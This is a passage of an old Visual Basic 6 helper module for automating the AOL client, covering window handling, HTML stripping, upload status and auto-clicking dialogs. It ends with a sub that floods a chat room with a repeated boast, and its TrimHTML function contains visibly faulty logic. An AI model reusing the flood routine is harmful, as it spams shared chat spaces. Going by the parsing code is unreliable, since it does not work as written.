NewMain$ = Left(NewMain$, (Instance& - 1)) & "" & Right(NewMain$, Len(NewMain$) - Instance&)
Loop
TrimNull$ = NewMain$
End Function
Public Function TrimHTML(TrimThisString As String) As String
        Dim LenString As Long, Instance As Long, NewMain As String
        Dim Instance2 As Long
NewMain$ = ReplaceCharacters(TrimThisString$, "<B>", "")
NewMain$ = ReplaceCharacters(NewMain$, "</B>", "")
NewMain$ = ReplaceCharacters(NewMain$, "<S>", "")
NewMain$ = ReplaceCharacters(NewMain$, "</S>", "")
NewMain$ = ReplaceCharacters(NewMain$, "<I>", "")
NewMain$ = ReplaceCharacters(NewMain$, "</I>", "")
NewMain$ = ReplaceCharacters(NewMain$, "<U>", "")
NewMain$ = ReplaceCharacters(NewMain$, "</U>", "")
NewMain$ = ReplaceCharacters(NewMain$, "<SUB>", "")
NewMain$ = ReplaceCharacters(NewMain$, "</SUB>", "")
NewMain$ = ReplaceCharacters(NewMain$, "</SUP>", "")
NewMain$ = ReplaceCharacters(NewMain$, "<HTML>", "")
NewMain$ = ReplaceCharacters(NewMain$, "</HTML>", "")
NewMain$ = ReplaceCharacters(NewMain$, "<FONT>", "")
NewMain$ = ReplaceCharacters(NewMain$, "</FONT>", "")
NewMain$ = ReplaceCharacters(NewMain$, "<BR>", "")
If InStr(NewMain$, "<FONT COLOR=") <> 0& Then
Do: DoEvents
If Right("<FONT COLOR=", Len("<FONT COLOR=") + 10) = "" Then
NewMain$ = Left(NewMain$, InStr(NewMain$, "<FONT COLOR=") - 1)
ElseIf Right("<FONT COLOR=", Len("<FONT COLOR=") + 10) <> "" Then
NewMain$ = Left(NewMain$, InStr(NewMain$, "<FONT COLOR=") - 1) & "" & Right(NewMain$, Len(NewMain$) - InStr(NewMain$, "<FONT COLOR=") - 21)
End If
Loop Until InStr(NewMain$, "<FONT COLOR=") = 0&
End If
If InStr(NewMain$, "<FONT SIZE=") <> 0& Then
Do: DoEvents
If Right("<FONT SIZE=", Len("<FONT SIZE=") + 2) = ">" Then
If Right("<FONT SIZE=", Len("<FONT SIZE=") + 2) = "" Then
NewMain$ = Left(NewMain$, InStr(NewMain$, "<FONT SIZE=") - 1)
ElseIf Right("<FONT SIZE=", Len("<FONT SIZE=") + 2) <> "" Then
NewMain$ = ReplaceCharacters(Left(NewMain$, InStr(NewMain$, "<FONT SIZE=") - 1) & "" & Right(NewMain$, Len(NewMain$) - InStr(NewMain$, "<FONT SIZE=") - 13), ">", "")
End If
ElseIf Right("<FONT SIZE=", Len("<FONT SIZE=") + 2) <> ">" Then
If Right("<FONT SIZE=", Len("<FONT SIZE=") + 3) = "" Then
NewMain$ = Left(NewMain$, InStr(NewMain$, "<FONT SIZE=") - 1)
ElseIf Right("<FONT SIZE=", Len("<FONT SIZE=") + 3) <> "" Then
NewMain$ = ReplaceCharacters(Left(NewMain$, InStr(NewMain$, "<FONT SIZE=") - 1) & "" & Right(NewMain$, Len(NewMain$) - InStr(NewMain$, "<FONT SIZE=") - 12), ">", "")
End If
End If
Loop Until InStr(NewMain$, "<FONT SIZE=") = 0&
End If
If InStr(NewMain$, "<BODY BGCOLOR=") <> 0& Then
Do: DoEvents
If Right("<BODY BGCOLOR=", Len("<BODY BGCOLOR=") + 12) = "" Then
NewMain$ = Left(NewMain$, InStr(NewMain$, "<BODY BGCOLOR=") - 1)
ElseIf Right("<BODY BGCOLOR=", Len("<BODY BGCOLOR=") + 12) <> "" Then
NewMain$ = Left(NewMain$, InStr(NewMain$, "<BODY BGCOLOR=") - 1) & "" & Right(NewMain$, Len(NewMain$) - InStr(NewMain$, "<BODY BGCOLOR=") - 23)
End If
Loop Until InStr(NewMain$, "<BODY BGCOLOR=") = 0&
End If
TrimHTML$ = NewMain$
End Function
Public Sub TimeOut(DaPause As Long)
        Dim Current As Long
Current = Timer
Do Until Timer - Current >= DaPause
DoEvents
Loop
End Sub
Public Sub UnloadAllForms()
    Dim OfTheseForms As Form
For Each OfTheseForms In Forms
Unload OfTheseForms
Set OfTheseForms = Nothing
Next OfTheseForms
End Sub
Public Sub UnUpchat()
        Dim AoFrame As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
Call WinDisable(AoFrame&)
Call WinEnable(FindUploadWindow&)
Call WinRestore(FindUploadWindow&)
End Sub
Public Sub Upchat()
        Dim AoFrame As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
Call WinEnable(AoFrame&)
Call WinMinimize(FindUploadWindow&)
Call WinDisable(FindUploadWindow&)
End Sub
Public Function UpLoadStatus(Optional EmphasisOnStats As Boolean = True) As String
If FindUploadWindow& = 0& Then
UpLoadStatus$ = "Not currently uploading"
Exit Function
End If
        Dim AoStatic1 As Long, AoStatic2 As Long
AoStatic1& = FindWindowEx(FindUploadWindow&, 0&, "_AOL_Static", vbNullString)
AoStatic2& = FindWindowEx(FindUploadWindow&, AoStatic1&, "_AOL_Static", vbNullString)
If EmphasisOnStats = True Then UpLoadStatus$ = "File transfer for: <b>" & GetInstance(GetText(AoStatic1&), " ", 3) & "</b>" & vbCrLf & "Percentage done: <b>" & ExtractNumeric(GetCaption(FindUploadWindow&)) & "%</b>" & vbCrLf & "Time remaining: <b>" & GetText(AoStatic2&)
If EmphasisOnStats = False Then UpLoadStatus$ = "File transfer for: " & GetInstance(GetText(AoStatic1&), " ", 3) & vbCrLf & "Percentage done: " & ExtractNumeric(GetCaption(FindUploadWindow&)) & "%" & vbCrLf & "Time remaining: " & GetText(AoStatic2&)
End Function
Public Function usersn() As String
If FindWelcome& = 0& Then Exit Function
usersn$ = Mid$(GetCaption(FindWelcome&), 10, (InStr(GetCaption(FindWelcome&), "!") - 10))
End Function
Public Function Version4() As Boolean
'Checks if the users version is 4
On Error Resume Next
        Dim AoFrame As Long
        Dim AoBar As Long
        Dim AoGlyph As Long
AoFrame& = FindWindow("aol frame25", vbNullString)
AoBar& = FindWindowEx(AoFrame&, 0&, "aol toolbar", vbNullString)
AoBar& = FindWindowEx(AoBar&, 0&, "_aol_toolbar", vbNullString)
AoGlyph& = FindWindowEx(AoBar&, 0&, "_aol_glyph", vbNullString)
If AoGlyph& <> 0 And AoBar& <> 0 Then
Version4 = True
Else
Version4 = False
End If
End Function
Public Sub WaitForListToLoad(listbox As Long)
        Dim FirstCount As Long, SecondCount As Long, ThirdCount As Long
        Dim LastCount As Long
Do: DoEvents
FirstCount& = ListCount(listbox&)
Pause 0.5
SecondCount& = ListCount(listbox&)
Pause 0.5
ThirdCount& = ListCount(listbox&)
Loop Until FirstCount& <> SecondCount& And ThirdCount& <> FirstCount&
Pause 0.5
LastCount& = ListCount(listbox&)
End Sub
Public Sub WaitForOKOrRoom(PrivateRoom As String)
        Dim MessageOk As Long, OKButton As Long, RoomCaption As String
PrivateRoom$ = LCase(TrimSpaces(PrivateRoom$))
Do: DoEvents
RoomCaption$ = LCase(TrimSpaces(GetCaption(FindRoom&)))
MessageOk& = FindWindow("#32770", "America Online")
Loop Until MessageOk& <> 0& Or RoomCaption$ = PrivateRoom$
If MessageOk& <> 0& Then
Do: DoEvents
OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
Loop Until MessageOk& = 0& Or OKButton& = 0&
End If
End Sub
Public Sub WinClose(WinHandle As Long)
Call PostMessage(WinHandle&, WM_CLOSE, 0&, 0&)
End Sub
Public Sub WriteToINI(Section As String, Key As String, KeyVal As String, Directory As String)
'Also by del
Call WritePrivateProfileString(Section$, UCase$(Key$), KeyVal$, Directory$)
End Sub

Public Sub WinBringToTop(WinHandle As Long)
Call BringWindowToTop(WinHandle&)
End Sub
Public Sub WinDisable(WinHandle As Long)
Call EnableWindow(WinHandle&, 0&)
End Sub
Public Sub WindowHide(hWnd As Long)
Call ShowWindow(hWnd&, SW_Hide)
End Sub
Public Sub WindowShow(hWnd As Long)
Call ShowWindow(hWnd&, SW_SHOW)
End Sub
Public Sub WinEnable(WinHandle As Long)
Call EnableWindow(WinHandle&, 1&)
End Sub
Public Sub WinFlash(win As Long, TimesToFlash As Long)
'Find the window you want to flash, or you can use Me.Hwnd
'then you can use Flash Me.Hwnd, 10   and the window will flash 10 times
        Dim wgf As Long
For wgf = 0 To TimesToFlash
Call FlashWindow(win, True)
Yield 1
 Next wgf
Call FlashWindow(win, False)
End Sub
Public Sub WinMaximize(WinHandle As Long)
Call ShowWindow(WinHandle&, SW_MAXIMIZE)
End Sub
Public Function WinMaximized(WinHandle As Long) As Boolean
        Dim MaxVal As Long
MaxVal& = IsZoomed(WinHandle&)
If MaxVal& > 0& Then
WinMaximized = True
ElseIf MaxVal& = 0& Then
WinMaximized = False
End If
End Function
Public Sub WinMinimize(WinHandle As Long)
Call ShowWindow(WinHandle&, SW_MINIMIZE)
End Sub
Public Function WinMinimized(WinHandle As Long) As Boolean
        Dim MinVal As Long
MinVal& = IsIconic(WinHandle&)
If MinVal& > 0& Then
WinMinimized = True
ElseIf MinVal& = 0& Then
WinMinimized = False
End If
End Function
Public Sub WinRestore(WinHandle As Long)
Call ShowWindow(WinHandle&, SW_RESTORE)
End Sub
Public Sub WinShow(WinHandle As Long)
Call ShowWindow(WinHandle&, SW_SHOW)
End Sub
Public Sub Yield(DaPause As Long)
        Dim InitialTime As Long
InitialTime& = Timer
Do Until Timer - InitialTime& >= DaPause&
DoEvents
Loop
End Sub
Sub yWgfTheSub()
'This will say Awgf2ooo rox! a lot of times in the chat, its lame but hey.
        Dim imsogladimdonethisbasthisisthelastsubiwrote As Long
        Dim Awgf2ooo As String
For imsogladimdonethisbasthisisthelastsubiwrote& = 1 To 105
Awgf2ooo$ = Awgf2ooo$ + " Awgf2ooo rox! "
Next
RoomSend ".<p=" & Awgf2ooo
End Sub

'<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
'<<<<<<I hope you enjoyed the Awgf2ooo.bas by:wgf @ martyr>>>>>>
'<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
